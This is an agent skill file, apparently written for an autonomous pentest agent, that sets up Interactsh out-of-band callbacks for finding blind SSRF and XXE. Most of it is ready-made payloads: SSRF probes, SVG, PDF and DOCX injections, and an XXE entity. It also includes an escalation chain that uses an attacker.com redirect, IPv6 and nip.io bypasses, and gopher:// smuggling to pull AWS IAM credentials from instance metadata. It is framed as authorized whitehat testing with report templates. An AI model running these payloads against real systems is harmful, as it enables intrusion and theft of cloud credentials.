---
name: interactsh-workflow
description: "Interactsh OOB callback manager for blind SSRF, XXE, SSTI, and dependency confusion. Auto-provisions unique subdomains, monitors callbacks, auto-classifies DNS vs HTTP signals. Load when: blind SSRF suspected, OOB callback needed for SSRF/XXE/injection, dependency confusion testing, any vector where you need proof the server made an outbound request."
version: 1.0
created: 2026-04-11
owner: cyber-operator
trigger_keywords: "interactsh, oob, out-of-band, blind ssrf callback, oast, oob ssrf, blind xxe, dns callback, http callback, collaborator, interact.sh"
---

# Interactsh OOB Callback Workflow

## Purpose

Interactsh provides unique callback subdomains for detecting out-of-band interactions. When injecting payloads that trigger server-side requests, Interactsh proves exploitation without requiring a visible HTTP response — essential for blind SSRF, XXE, command injection, and dependency confusion.

---

## Step 1 — Provision a Callback Subdomain

### Option A: CLI Client (Preferred)
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Provision one unique subdomain, monitor for callbacks
interactsh-client -server oast.pro -n 1 -v

# Output example:
# [INF] Listing 1 payload for OOB Testing
# [INF] c2sdgh3b7abc1234.oast.pro
```

**Save your FQDN:** `c2sdgh3b7abc1234.oast.pro` — use this in all payloads below.

### Option B: Web UI (Fallback if CLI unavailable)
```
1. Navigate to https://app.interactsh.com
2. Click "Copy" next to the generated FQDN
3. Keep tab open to monitor callbacks
```

### Option C: ProjectDiscovery-hosted fallback
```bash
# Alternative OOB servers (use if oast.pro is filtered)
# oast.fun | oast.site | oast.online | oast.me | oast.pw
interactsh-client -server oast.fun -n 1
```

---

## Step 2 — Payload Construction by Vector

Replace `{FQDN}` with your provisioned subdomain from Step 1.

### Direct URL Parameter SSRF
```
# Basic — confirms server fetches URLs
?url=http://{FQDN}/ssrf-probe
?src=http://{FQDN}/ssrf-probe
?webhook_url=http://{FQDN}/webhook-probe

# DNS-only variant (for restrictive environments that block HTTP egress)
?url=http://{FQDN}
# → DNS lookup alone = confirmed blind SSRF
```

### Referer Header SSRF
```http
GET /api/preview HTTP/1.1
Host: target.com
Referer: http://{FQDN}/referer-probe
```

### SVG/Image Processing SSRF
```xml
<!-- Upload as .svg or inject into image field -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="http://{FQDN}/svg-ssrf"/>
</svg>
```

### PDF Generator SSRF
```html
<!-- Inject into any field rendered to PDF (invoices, reports) -->
<img src="http://{FQDN}/pdf-ssrf">
<link rel="stylesheet" href="http://{FQDN}/css-ssrf">
```

### OIDC Discovery URL SSRF
```
# If app accepts an issuer/discovery URL:
issuer=http://{FQDN}/.well-known/openid-configuration
discovery_url=http://{FQDN}/.well-known/openid-configuration
```

### XXE OOB Exfil
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://{FQDN}/xxe-oob">
]>
<root>&xxe;</root>
```

### GraphQL URL Field
```graphql
mutation {
  createWebhook(url: "http://{FQDN}/graphql-webhook") {
    id
  }
}
```

### Office Document (DOCX/XLSX) SSRF
```xml
<!-- In _rels/document.xml.rels: -->
<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
  Target="http://{FQDN}/docx-ssrf" TargetMode="External"/>
```

---

## Step 3 — Signal Classification

After sending payload, wait 10-15 seconds for callbacks. Classify by what Interactsh receives:

| Signal Received | Classification | Severity | CVSS 4.0 |
|----------------|----------------|----------|----------|
| **HTTP GET with IMDS credential response** | Critical SSRF — Full IAM credential theft | Critical | 9.3 |
| **HTTP GET to your FQDN** | Full SSRF — Server makes outbound HTTP requests | High | 8.0 |
| **DNS lookup only** | Blind SSRF — DNS egress confirmed | Medium-High | 6.9 |
| **No signal** | SSRF not confirmed — try escalation track | N/A | N/A |

**CVSS 4.0 Pre-fills:**
```
Critical SSRF → IMDS:
AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H = 9.3

Full SSRF (HTTP callback):
AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N = 8.0

Blind SSRF (DNS only):
AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N = 6.9
```

---

## Step 4 — Auto-Escalation Chain

```
DNS callback received:
  Step 4a: Try HTTP escalation
    → Replace DNS-only FQDN with full URL: http://{FQDN}/escalate
    → If HTTP fires: escalate to Critical chain

  Step 4b: Try redirect chain to IMDS
    → ?url=http://attacker.com/redirect → Location: http://169.254.169.254/
    → Or: ?url=http://169.254.169.254.nip.io/latest/meta-data/
    → Or: ?url=http://[::ffff:169.254.169.254]/latest/meta-data/

  Step 4c: Try gopher:// protocol smuggling
    → ?url=gopher://169.254.169.254:80/_GET%20/latest/meta-data/iam/security-credentials/%0D%0A
    → gopher:// forces TCP connection — bypasses http:// filters
    → Use Gopherus: python gopherus.py --exploit ssrf for payload generation

HTTP callback received:
  Step 4d: Pull IMDS credentials directly
    → ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    → Response: IAM role name
    → ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}
    → Response: AccessKeyId + SecretAccessKey + Token = CRITICAL finding
```

---

## Step 5 — Sweep Engine Integration

**Sub-Agent C (Request Manipulation) — Interactsh Auto-Provisioning:**

At sweep start, Sub-Agent C provisions ONE Interactsh token and embeds it in ALL SSRF/OOB test payloads:

```
1. Provision: interactsh-client -server oast.pro -n 1 → store FQDN in sweep state
2. Inject FQDN into every SSRF payload template before execution
3. After all SSRF probes sent: query CLI or wait for web UI update (15s window)
4. Parse any callbacks: classify per Step 3 table
5. Auto-escalate if DNS-only received
```

**Parallel with Overseer 1 (Web Track):** Interactsh is non-blocking — provision once, use across all sub-agents in the same tier.

---

## Evidence for Report

When Interactsh fires, capture:
1. CLI output: `[REQ] Received HTTP interaction from X.X.X.X for c2sdgh3b7abc1234.oast.pro`
2. Screenshot of Interactsh web UI showing the interaction
3. Originating IP (confirms it's from the target server, not your machine)
4. Timestamp correlation with your probe request

**POC block format for report:**
```
1. Send: GET /api/fetch?url=http://c2sdgh3b7abc1234.oast.pro/probe HTTP/1.1
2. Result: Interactsh received HTTP callback from [target_server_IP]
3. Evidence: [screenshot or CLI output]
4. Escalation: [if DNS only — see Step 4; if HTTP — see IMDS chain]
```

---

*Interactsh Workflow v1.0 | Whitehat System | Blind SSRF OOB Infrastructure*
